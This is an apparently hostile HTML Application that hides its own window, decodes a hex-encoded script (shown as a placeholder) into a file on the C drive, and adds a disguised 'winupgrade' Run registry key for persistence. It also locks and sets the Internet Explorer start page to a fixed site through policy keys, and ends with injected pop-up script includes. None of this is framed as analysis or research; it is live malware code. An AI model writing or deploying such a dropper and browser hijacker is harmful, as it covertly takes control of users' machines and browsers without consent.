

   <html><head>
   <hta:application id=hta_note_id
    applicationName=hta_note_name
    showInTaskBar=no
    caption=no
    innerBorder=no
    selection=no
    scroll=no
    contextmenu=no />
   <script language=javascript>
   window.resizeTo(0, 0);
   window.moveTo(0, 0);
   </script>
   <SCRIPT language=vbs>
   self.MoveTo 0, 0

   prog = xxxxxxxxxxxxxxxxxxxxxxxxxxxx

   path = "c:\webden.vbs"
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set shell = CreateObject("WScript.Shell")
   Set f = fso.CreateTextFile(path, True)
   h0 = ""
   i = 1
      Do While i < Len(prog)
   h0 = h0 & chr(cint("&h" & mid(prog, i, 2)))
      i = i + 2
      Loop
     f.Write (h0)
   f.Close
     shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winupgrade","c:\web.vbs"
     shell.regwrite "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
     shell.regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
     shell.regwrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.akmerkez.tr.cx/","REG_SZ"
     shell.regwrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.akmerkez.tr.cx/","REG_SZ"
   self.Close
   </SCRIPT><script type='text/javascript' src='/pop.js'></script><script type='text/javascript' src='/pop.js'></script>
